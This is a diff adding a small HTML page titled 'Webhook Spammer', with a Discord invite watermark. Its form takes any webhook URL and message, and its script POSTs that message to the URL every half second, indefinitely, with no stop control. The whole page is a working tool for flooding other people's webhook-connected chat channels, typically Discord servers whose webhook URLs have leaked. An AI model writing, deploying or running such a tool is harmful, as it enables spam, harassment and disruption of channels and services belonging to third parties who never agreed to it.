@@ -1,1 +1,73 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Spammer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #111;
+            color: white;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background: red;
+            color: white;
+            cursor: pointer;
+        }
+        .watermark {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Webhook Spammer</h1>
+        <input type="text" id="webhookUrl" placeholder="Enter Webhook URL">
+        <input type="text" id="message" placeholder="Enter Message">
+        <input type="text" id="extraText" placeholder="Enter Extra Text">
+        <label>
+            <input type="checkbox" id="embedOption"> Enable Embed
+        </label>
+        <button onclick="startSpam()">Start Spamming</button>
+    </div>
+    <div class="watermark">Join: <a href="https://discord.gg/Hhgd5SsMfA" target="_blank">discord.gg/Hhgd5SsMfA</a></div>
+    <script>
+        function startSpam() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const message = document.getElementById('message').value;
+            const extraText = document.getElementById('extraText').value;
+            const embedEnabled = document.getElementById('embedOption').checked;if (!webhookUrl || !message) {
+            alert("Please fill in all fields");
+            return;
+        }
 
+        const data = embedEnabled ? {
+            embeds: [{ description: message + " " + extraText, color: 16711680 }]
+        } : { content: message + " " + extraText };
+
+        setInterval(() => {
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(err => console.error("Error sending webhook:", err));
+        }, 500);
+    }
+</script>
+
+</body>
+</html>
